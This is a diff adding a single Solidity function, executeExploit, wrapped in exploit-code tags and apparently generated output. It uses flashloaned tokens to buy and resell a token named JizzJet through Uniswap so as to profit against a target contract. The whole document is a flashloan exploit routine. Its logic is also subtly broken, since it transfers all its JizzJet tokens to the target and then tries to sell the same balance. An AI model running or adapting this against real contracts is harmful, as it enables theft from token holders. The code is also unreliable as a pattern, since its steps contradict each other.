@@ -1,0 +1,57 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // 1. Get the current balance of valuableToken and log it
+    uint256 initialBalance = valuableToken.balanceOf(address(this));
+    console.log("Initial valuableToken balance: ", initialBalance);
+    
+    // 2. Use the flashloaned tokens to buy JizzJet through Uniswap
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(target); // JizzJet token address
+
+    // We utilize the token's current price to determine how much we can buy
+    uint256[] memory amountsOut = uniswapRouter.getAmountsOut(amount, path);
+    uint256 amountOutMin = amountsOut[1]; // amount of JizzJet we expect to receive
+
+    // 3. Perform the swap
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount,
+        amountOutMin,
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // 4. Confirm we now have JizzJet tokens
+    uint256 jizzTokenBalance = IERC20(target).balanceOf(address(this));
+    console.log("JizzJet token balance: ", jizzTokenBalance);
+
+    // 5. Transfer JizzJet tokens to the JizzJet contract or perform actionable logic
+    require(IERC20(target).transfer(target, jizzTokenBalance), "Transfer failed");
+
+    // 6. Now we need to sell back the JizzJet tokens to get back valuableTokens smartly
+    path[0] = address(target);
+    path[1] = address(valuableToken);
+
+    // Call the swap again
+    uint256[] memory returnAmounts = uniswapRouter.getAmountsOut(jizzTokenBalance, path);
+    uint256 jizzOutMin = returnAmounts[1]; // get min amount of valuableTokens we expect
+    
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        jizzTokenBalance,
+        jizzOutMin,
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // 7. Confirm our final balance of valuableToken
+    uint256 finalValuableTokenBalance = valuableToken.balanceOf(address(this));
+    console.log("Final valuableToken balance: ", finalValuableTokenBalance);
+
+    // 8. Check if we made a profit: whether the final balance is more than the amount we need to pay back 
+    require(finalValuableTokenBalance > amount, "Not enough valuableToken balance to cover the flashloan");
+}
+</executeExploitCode>
+```
